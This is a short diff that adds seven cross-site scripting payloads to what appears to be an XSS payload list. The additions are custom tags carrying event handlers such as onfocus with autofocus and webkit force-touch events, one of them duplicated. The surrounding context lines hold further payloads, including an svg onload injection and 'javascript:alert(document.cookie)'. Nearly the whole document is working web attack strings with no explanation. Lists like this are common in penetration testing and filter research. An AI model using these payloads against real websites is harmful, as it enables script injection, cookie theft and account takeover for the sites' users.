@@ -61,6 +61,13 @@ admin";alert(1);//
 xss" onmouseover="alert(1)                                              
 "><svg onload=alert(1)>
 javascript:alert(document.cookie) 
+<xss onpointercancel=alert(1)>XSS</xss>
+<xss onfocus=alert(1) autofocus tabindex=1>
+<xss onwebkitmouseforceup=alert(1)>XSS</xss>
+<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>
+<xss onwebkitmouseforceup=alert(1)>XSS</xss>
+<xss onwebkitmouseforcedown=alert(1)>XSS</xss>
+<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>
 
                                                                     ## HTML injection to XSS>
 
